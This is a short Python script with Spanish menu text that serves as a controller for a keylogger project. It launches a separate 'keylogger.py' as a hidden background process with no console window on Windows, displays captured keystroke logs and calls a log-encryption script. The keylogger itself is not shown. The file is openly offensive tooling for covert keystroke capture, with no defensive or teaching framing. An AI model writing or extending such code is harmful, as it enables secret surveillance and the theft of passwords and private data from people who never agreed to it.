import subprocess
import sys
import os

def start_logger():
    subprocess.Popen([sys.executable, "keylogger.py"], creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0)

def view_logs():
    with open("logs/log.txt", "r") as f:
        print(f.read())

def encrypt_logs():
    os.system(f"{sys.executable} log_encryptor.py")

def main():
    print("1. Iniciar keylogger")
    print("2. Ver registros")
    print("3. Cifrar registros")
    choice = input("Selecciona una opción: ")

    if choice == "1":
        start_logger()
    elif choice == "2":
        view_logs()
    elif choice == "3":
        encrypt_logs()
    else:
        print("Opción no válida.")

if __name__ == "__main__":
    main()